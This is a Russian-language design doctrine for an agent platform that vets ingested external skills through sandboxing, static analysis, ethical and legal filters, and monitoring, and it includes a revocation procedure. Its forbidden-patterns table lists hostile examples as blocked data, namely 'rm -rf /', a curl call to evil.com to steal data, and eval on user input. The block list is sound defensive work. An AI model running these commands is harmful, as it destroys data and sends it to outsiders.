# 🛡️ Здоровый паттерн поедания: защита от вирусов

**Статус:** Доктрина. Фаза 0.
**Дата:** 06.05.2026

---

## Концепция

"Поедание" — это процесс, при котором платформа принимает внешний навык, код или данные и встраивает их в свой организм. Чтобы не запустить вирус, каждый "съеденный" элемент проходит многоуровневую проверку.

## Уровни защиты

### Уровень 1: Изоляция (Sandbox)
Всё внешнее попадает в Docker-песочницу. Никакого доступа к основной сети и данным.

### Уровень 2: Статический анализ (Хранитель)
- Mythos Agent сканирует код на CVE.
- Проверка на запрещённые паттерны (eval, exec, rm -rf).
- Анализ зависимостей (npm audit, pip audit).

### Уровень 3: Этический фильтр (Директор по Смыслу)
- Не противоречит ли навык миссии WATERS?
- Не ведёт ли к уничтожению жизни?
- Соответствует ли Ясе?

### Уровень 4: Юридический фильтр (Законодатель)
- Соответствует ли внешним стандартам (NASA, ESA)?
- Не нарушает ли лицензии (MIT, Apache)?
- Нет ли копилефт-заражения?

### Уровень 5: Наблюдение (Мониторинг)
- После утверждения навык работает под наблюдением.
- При первых признаках аномалии — отзыв через `skills.incident.v1`.

## Запрещённые паттерны

| Паттерн | Пример | Почему запрещён |
|:---|:---|:---|
| **eval/exec** | `eval(user_input)` | Выполнение произвольного кода |
| **Удаление файлов** | `rm -rf /` | Уничтожение данных |
| **Сетевые атаки** | `curl http://evil.com/steal` | Кража данных |
| **Модификация Ясы** | `yasa.override()` | Обход правил |

## Процедура отзыва навыка

1. Хранитель обнаруживает инцидент → `skills.incident.v1`.
2. Законодатель отзывает навык → `skills.rejected.v1`.
3. Все агенты, использующие навык, останавливаются.
4. Интегратор ищет замену.
5. Хранитель публикует постмортем.
